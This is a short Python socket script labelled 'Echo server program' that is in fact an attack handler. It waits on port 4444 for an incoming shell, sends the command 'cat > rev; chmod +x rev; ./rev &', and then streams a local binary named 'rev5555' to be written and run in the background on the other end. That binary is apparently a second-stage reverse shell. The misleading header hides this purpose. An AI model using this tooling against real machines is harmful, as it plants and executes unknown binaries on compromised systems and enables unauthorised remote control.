# Echo server program
import socket
import threading
import time

conn = None

#S = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#S.connect(("127.0.0.1", 5555))

def recv_proxy_stream(con):
    global conn
    global S
    while True:
        data = con.recv(1024)
        print(f"received: {data}")
        S.sendall(data)

def send_stream(con):
    global conn
    global S

    while True:
        data = S.recv(1024)
        print(data)
        con.sendall(data)

def recv_stream_save(con):
    global conn
    global S
    with open("recv_stream", "w") as f:
        f.write("")
    while True:
        data = con.recv(1024)
        if data:
            with open("recv_stream", "a") as f:
                f.write(data.decode())


def recv_stream(con):
    global conn
    global S
    con.settimeout(0.2)
    while True:
        try:
            data = con.recv(1024)
            if data:
                print(f"received: {data}")
        except:
            pass

def recv_data(con):
    global conn
    global S
    d = ""
    while True:
        data = con.recv(1024)
        if data:
            d += data.decode()
            print(f"received: {data}")
        else:
            return d
running = True            

def recv(conn):
    global running
    while running:
        try:
            conn.recv(1024)
        except:
            pass

def send(conn, data):
    print()
    if len(data) < 100:
        print(f"\nsending {data}")
    else:
        print("sending large chunk")

    conn.sendall(data)

    #print()
    time.sleep(1)


#HOST = '127.0.0.1'
#PORT = 5555




HOST = '127.0.0.1'
PORT = 4444
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((HOST, PORT))
    sock.listen(1)
    conn, addr = sock.accept()
    conn.settimeout(0.2)
    with conn:
        print('Connected by', addr)
        #threading.Thread(target=send_stream, args=(conn,)).start()
        #threading.Thread(target=recv_stream_save, args=(conn,)).start()
        threading.Thread(target=recv_stream, args=(conn,)).start()

        #threading.Thread(target=recv, args=(conn,)).start()
        #threading.Thread(target=recv_proxy_stream, args=(conn,)).start()




        s = f"cat > rev; chmod +x rev; ./rev &\n".encode()#; chmod +x rev; ./rev &\n".encode()
        send(conn, s)


        with open("rev5555","rb") as f:
            r = f.read()
        send(conn, r)




        #s = "\x04\n".encode()
        #send(conn, s)


        conn.close()
        #print(s)
        running = False
        #exit()


